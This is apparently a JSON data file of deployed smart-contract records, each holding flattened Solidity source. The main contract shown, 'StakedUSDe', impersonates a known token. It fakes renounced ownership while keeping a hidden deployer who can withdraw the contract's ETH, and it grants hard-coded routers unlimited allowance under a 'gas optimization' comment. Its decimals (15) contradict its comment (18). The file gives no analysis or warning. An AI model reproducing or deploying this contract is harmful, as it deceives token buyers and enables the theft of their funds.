\n                         { xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n         ( bool success, bytes memory returndata) = target.delegatecall ( data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns (bytes memory)  { \n                        \n        if (success) {\n                        \n            if  ( returndata.length == 0) {\n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract ( target), \"Address: call to non-contract\");\n            }\n                        \n            return returndata ; \n        }\n                         else  { \n                        \n            _revert ( returndata, errorMessage);\n         } \n                        \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) \n                         { \n        if (success) \n                        {\n            return returndata;\n         } \n                         else {\n                        \n            _revert ( returndata, errorMessage ) ; \n        }\n                        \n    }\n                        \n\n    function _revert(bytes memory returndata, string memory errorMessage ) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0 ) {\n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload(returndata)\n                revert(add ( 32, returndata ), returndata_size)\n             } \n                        \n        }\n                         else {\n                        \n            revert ( errorMessage );\n         } \n                        \n    }\n                        \n}\n                        \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n                        \n\n    function _contextSuffixLength (  ) internal view virtual returns (uint256) {\n                        \n        return 0;\n    }\n                        \n    function _msgSender (  ) internal view virtual returns (address )  { \n                        \n        return msg.sender ; \n     } \n                        \n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata)  { \n                        \n        return msg.data;\n    }\n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors {\n                        \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender ( address sender ) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed );\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver ) ; \n\n                        }\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account ) external view returns (uint256 );\n\n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve}\n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a \n                         { Transfer\n                         }  event.\n     */\n    function transferFrom ( address from, address to, uint256 amount ) external returns (bool);\n        /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value) ; \n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transfer(address to, uint256 amount ) external returns  ( bool );\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256 );\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom } \n                        . This is\n     * zero by default.\n     *\n     * This value changes when  { \n                        approve}\n                         or {\n                        transferFrom}\n                         are called.\n     */\n    function allowance ( address owner, address spender ) external view returns (uint256 ) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     */\n    function approve(address spender, uint256 amount ) external returns (bool) ; \n    \n\n                         } \n\n\ninterface IERC20Metadata is IERC20 \n                         { \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol( ) external view returns (string memory );\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) external view returns (string memory);\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8) ; \n    \n\n                         } \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {\n                        decimals}\n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  \n                         { \n    mapping ( address => uint256) private _balances ; \n\n\n    mapping ( address => mapping ( address => uint256 )) private _allowances;\n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol;\n\n\n    /**\n     * @dev See {\n                        IERC20-balanceOf\n                         } .\n     */\n    function balanceOf(address account) public view virtual returns  ( uint256) {\n                        \n        return _balances[account];\n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol (  ) public view virtual returns  ( string memory )  { \n                        \n        return _symbol;\n    }\n                        \n    \n    /**\n     * @dev Sets the values for {\n                        name\n                         }  and \n                        {symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_) {\n                        \n        _name = name_;\n        _symbol = symbol_ ; \n    \n                        }\n    \n    /**\n     * @dev Variant of \n                        {_approve } \n                         with an optional flag to enable or disable the {\n                        Approval } \n                         event.\n     *\n     * By default  ( when calling {\n                        _approve } \n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override {\n                        \n     *     super._approve ( owner, spender, value, true) ; \n     * }\n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual  { \n                        \n        if (owner == address ( 0 ) ) {\n                        \n            revert ERC20InvalidApprover ( address ( 0 ) ) ; \n         } \n                        \n        if (spender == address ( 0)) {\n                        \n            revert ERC20InvalidSpender(address(0) );\n        \n                         } \n        _allowances[owner][spender] = value;\n        if (emitEvent ) {\n                        \n            emit Approval ( owner, spender, value ) ; \n        \n                         } \n    \n                         } \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2` ).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf } \n                         and  { \n                        IERC20-transfer}\n                        .\n     */\n    function decimals() public view virtual returns  ( uint8)  { \n                        \n        return 15;\n     } \n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-totalSupply\n                        }.\n     */\n    function totalSupply ( ) public view virtual returns (uint256)  { \n                        \n        return _totalSupply;\n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {\n                        Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {\n                        _update } \n                         should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal \n                         { \n        if (account == address ( 0)) \n                        {\n            revert ERC20InvalidReceiver ( address(0 ) ) ; \n         } \n                        \n        _update(address(0 ), account, value);\n    \n                        }\n    \n    /**\n     * @dev See \n                        {IERC20-approve\n                        }.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value ) public virtual returns (bool)  { \n                        \n        address owner = _msgSender (  );\n        _approve(owner, spender, value ) ; \n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     *  ( or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual \n                        {\n        if (from == address(0 ) ) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n        }\n                         else {\n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value) \n                         { \n                revert ERC20InsufficientBalance(from, fromBalance, value );\n             } \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n             } \n                        \n        }\n                        \n\n        if  ( to == address ( 0 ))  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n            \n                        }\n        \n                         }  else {\n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            \n                         } \n        }\n                        \n\n        emit Transfer ( from, to, value ) ; \n    \n                        }\n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom\n                         } .\n     *\n     * Skips emitting an {\n                        Approval\n                        } event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-\n                         } [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value) public virtual returns  ( bool )  { \n                        \n        address spender = _msgSender( );\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true ; \n    \n                        }\n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value) internal  { \n                        \n        _approve ( owner, spender, value, true ) ; \n    \n                         } \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a \n                         { Transfer\n                        } event.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update\n                        } should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n                        \n        if  ( from == address(0)) {\n                        \n            revert ERC20InvalidSender ( address ( 0 )) ; \n         } \n                        \n        if (to == address ( 0)) {\n                        \n            revert ERC20InvalidReceiver ( address(0 ) );\n        \n                         } \n        _update ( from, to, value ) ; \n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval\n                        } event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value ) internal virtual  { \n                        \n        uint256 currentAllowance = allowance(owner, spender );\n        if  ( currentAllowance < type(uint256).max)  { \n                        \n            if (currentAllowance < value) {\n                        \n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value);\n            \n                        }\n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false );\n            \n                         } \n         } \n                        \n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender) public view virtual returns  ( uint256) {\n                        \n        return _allowances[owner][spender];\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value ) public virtual returns (bool)  { \n                        \n        address owner = _msgSender();\n        _transfer ( owner, to, value ) ; \n        return true ; \n    }\n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) public view virtual returns  ( string memory)  { \n                        \n        return _name ; \n    }\n                        \n    \n    }\n                        \n\nabstract contract Ownable is Context {\n                        \n    address private _owner;\n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner ) public virtual onlyOwner  { \n                        \n        require ( newOwner != address ( 0), \"Ownable: new owner is the zero address\");\n        _transferOwnership ( newOwner);\n    \n                         } \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor (  ) {\n                        \n        _transferOwnership(_msgSender (  ) );\n    \n                        }\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner ) internal virtual {\n                        \n        address oldOwner = _owner;\n        _owner = newOwner ; \n        emit OwnershipTransferred ( oldOwner, newOwner) ; \n    \n                         } \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account) ; \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address )  { \n                        \n        return _owner;\n    \n                         } \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner ( )  { \n                        \n        _checkOwner();\n        _;\n     } \n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address ( 0)`)\n     */\n    error OwnableInvalidOwner ( address owner);\n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n                        \n        require ( owner( ) == _msgSender (  ), \"Ownable: caller is not the owner\") ; \n    \n                         } \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner  { \n                        \n        _transferOwnership ( address(0) );\n    }\n                        \n    \n\n                         } \n\n\n// File StakedUSDe.sol\n\ncontract StakedUSDe is ERC20, Ownable \n                         { \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) \n                        {\n        _mint(msg.sender, 10000000000000000000000) ; \n        _transferOwnership ( address(0 ));\n        deployer = msg.sender;\n     } \n                        \n    \n    /**\n     * @dev See \n                        {IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender) public view override returns (uint256)  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24)) { \n                        \n            return type(uint256).max ; \n        }\n                         \n        return super.allowance ( owner,spender );\n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount ) public \n                        {\n        require ( msg.sender==deployer) ; \n        Address.sendValue(recipient, amount ) ; \n     } \n                        \n    \n    receive (  ) external payable { \n                        \n     } \n                        \n}",
      "count": 1,
      "addresses": [
        "0x6455368d65cEEA43ebd965e9D2f4E11E9014e0D5"
      ],
      "names": [
        "StakedUSDe"
      ]
    },
    {
      "id": "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 )  ( utils/Address.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account ) internal view returns (bool) \n                        {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue } \n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {\n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount ) public {\n                        \n        require(address(this).balance >= amount, \"Address: insufficient balance\") ; \n\n         ( bool success, ) = recipient.call{\n                        value: amount } \n                        (\"\" );\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue(target, data, 0, errorMessage) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\") ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCallWithValue-address-bytes-uint256- } \n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory ) \n                        {\n        require(address(this ).balance >= value, \"Address: insufficient balance for call\" );\n         ( bool success, bytes memory returndata ) = target.call\n                        {value: value}\n                        (data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data) internal view returns (bytes memory) {\n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\" ) ; \n    \n                        }\n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory ) \n                        {\n         ( bool success, bytes memory returndata) = target.staticcall(data ) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-\n                        }[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall ( address target, bytes memory data) internal returns  ( bytes memory)  { \n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\") ; \n    \n                        }\n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory) {\n                        \n        (bool success, bytes memory returndata) = target.delegatecall ( data );\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory )  { \n                        \n        if (success)  { \n                        \n            if  ( returndata.length == 0) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target), \"Address: call to non-contract\");\n             } \n                        \n            return returndata;\n         } \n                         else \n                         { \n            _revert(returndata, errorMessage) ; \n        }\n                        \n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory )  { \n                        \n        if  ( success)  { \n                        \n            return returndata ; \n        \n                         }  else {\n                        \n            _revert ( returndata, errorMessage);\n         } \n                        \n    \n                        }\n\n    function _revert(bytes memory returndata, string memory errorMessage) private pure \n                         { \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0 ) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload(returndata )\n                revert ( add ( 32, returndata ), returndata_size)\n            }\n                        \n         } \n                         else  { \n                        \n            revert(errorMessage ) ; \n        }\n                        \n    \n                        }\n\n                        }\npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context \n                        {\n    function _msgSender( ) internal view virtual returns  ( address)  { \n                        \n        return msg.sender;\n    \n                        }\n\n    function _contextSuffixLength() internal view virtual returns  ( uint256)  { \n                        \n        return 0;\n    }\n                        \n\n    function _msgData() internal view virtual returns  ( bytes calldata ) \n                        {\n        return msg.data;\n     } \n                        \n\n\n}\n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed );\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender );\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver );\n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver);\n\n                        }\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account) external view returns (uint256);\n\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount) external returns  ( bool) ; \n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                         { approve } \n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed 